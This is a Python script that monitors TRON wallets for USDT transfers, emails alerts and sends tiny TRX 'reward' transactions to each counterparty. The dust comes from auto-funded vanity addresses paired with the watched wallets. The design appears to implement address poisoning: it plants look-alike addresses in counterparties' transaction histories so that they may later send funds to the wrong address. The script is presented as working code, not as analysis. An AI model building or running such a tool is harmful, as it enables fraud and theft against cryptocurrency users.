import requests, smtplib, os, time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from decimal import Decimal
from datetime import datetime, timedelta
from tronpy.keys import PrivateKey  # only for signing

load_dotenv()

# Env
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
NOWNODES_API_KEY = os.getenv("NOWNODES_API_KEY")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES","").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES","").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS","").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")
AVOID_ADDRESSES = set(os.getenv("AVOID_ADDRESSES","").split(","))

USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
REWARD_INTERVAL = timedelta(hours=1)

# Validate
if not all([EMAIL_SENDER,EMAIL_PASSWORD,EMAIL_RECEIVER,NOWNODES_API_KEY]):
    print("Missing config"); exit(1)
if not(len(WALLET_ADDRESSES)==len(VANITY_ADDRESSES)==len(VANITY_PRIVATE_KEYS)):
    print("Mismatch address/key counts"); exit(1)

# Headers
HEADERS = {"api-key":NOWNODES_API_KEY,"Content-Type":"application/json"}
RPC_URL = "https://trx.nownodes.io"

# State
last_tx = {}
last_reward = {}

def rpc(method, params):
    resp = requests.post(RPC_URL, json={"jsonrpc":"2.0","id":1,"method":method,"params":params}, headers=HEADERS)
    resp.raise_for_status()
    return resp.json()["result"]

def get_trx_balance(addr):
    try:
        res = rpc("trx_getBalance", [addr])
        return Decimal(res)/Decimal(1_000_000)
    except Exception as e:
        print("Balance error", e)
        return Decimal(0)

def send_trx(from_addr, privkey_hex, to_addr, amount=Decimal("0.000001")):
    amt_sun = int(amount*Decimal(1_000_000))
    try:
        unsigned = rpc("trx_transfer", [from_addr, to_addr, amt_sun])
        pk = PrivateKey(bytes.fromhex(privkey_hex))
        signed = pk.sign_transaction(unsigned)
        txid = rpc("trx_broadcast", [signed])
        print(f"Sent {amount} TRX to {to_addr}, txid {txid}")
    except Exception as e:
        print("Send TRX error", e)

def fund_if_needed(addr):
    bal = get_trx_balance(addr)
    if bal < Decimal(1):
        print(f"Funding {addr}, balance {bal}")
        send_trx(PrivateKey(bytes.fromhex(FUNDING_PRIVATE_KEY)).public_key.to_base58check_address(),
                 FUNDING_PRIVATE_KEY, addr, Decimal(1.5))

def is_contract(addr):
    try:
        acc = rpc("tron_getAccount", [addr])
        return "contract_address" in acc and acc["contract_address"]
    except:
        return False

def send_email(subject, body):
    try:
        m=MIMEText(body); m["Subject"]=subject; m["From"]=EMAIL_SENDER; m["To"]=EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com",465) as s:
            s.login(EMAIL_SENDER,EMAIL_PASSWORD)
            s.sendmail(EMAIL_SENDER,EMAIL_RECEIVER,m.as_string())
        print("Email sent")
    except Exception as e:
        print("Email error", e)

def get_latest_usdt_tx(addr):
    url=f"https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&count=true&limit=1&start=0&address={addr}&trc20Transfer=true"
    r = requests.get(url, timeout=10)
    if r.status_code!=200: return None
    data = r.json().get("data",[])
    if not data: return None
    info = data[0]["trc20TransferInfo"][0]
    return {"txid":data[0]["hash"], "from":info["from_address"],
            "to":info["to_address"], "amt":Decimal(info["amount_str"])/Decimal(1e6),
            "contract":info["contract_address"]}

print("🚀 Starting monitor")
if os.getenv("SEND_TEST_EMAIL","false").lower()=="true":
    send_email("TRON Monitor", "Started")

while True:
    for i, addr in enumerate(WALLET_ADDRESSES):
        print("Checking", addr)
        fund_if_needed(VANITY_ADDRESSES[i])
        tx = get_latest_usdt_tx(addr)
        if tx and tx["txid"] != last_tx.get(addr):
            last_tx[addr] = tx["txid"]
            if tx["contract"]!=USDT_CONTRACT:
                print("Not USDT"); continue
            if tx["amt"]<1:
                print("Too small"); continue
            partner = tx["to"] if tx["from"]==addr else tx["from"]
            if partner in WALLET_ADDRESSES+VANITY_ADDRESSES or partner in AVOID_ADDRESSES:
                print("Ignored partner"); continue
            if is_contract(partner):
                print("Partner is contract"); continue
            body = f"""New USDT on {addr}\nAmt: {tx['amt']}\nFrom: {tx['from']}\nTo: {tx['to']}\nTxid: {tx['txid']}\nhttps://tronscan.org/#/transaction/{tx['txid']}"""
            send_email("USDT TX alert", body)
            now = datetime.utcnow(); lr=last_reward.get(partner)
            if not lr or now-lr>REWARD_INTERVAL:
                send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], partner)
                last_reward[partner] = now
            else:
                print("Recently rewarded")
        time.sleep(1)
    print("Sleeping 30s")
    time.sleep(30)
